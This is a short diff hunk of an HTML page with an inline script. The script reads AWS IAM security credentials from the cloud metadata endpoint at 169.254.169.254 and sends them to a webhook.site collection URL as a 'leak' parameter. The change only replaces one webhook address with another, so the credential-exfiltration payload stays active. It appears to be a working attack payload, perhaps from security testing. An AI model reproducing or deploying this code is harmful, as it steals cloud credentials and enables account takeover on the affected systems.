@@ -7,7 +7,7 @@
         fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
         .then(response => response.text())
         .then(data => {
-            fetch("https://webhook.site/928a4b3e-205c-4b29-98e8-bf23a54bb527?leak=" + encodeURIComponent(data));
+            fetch("https://webhook.site/384ecd47-593d-488d-ba66-b92a61cb4cd6?leak=" + encodeURIComponent(data));
         })
         .catch(error => console.log("Error:", error));
     </script>
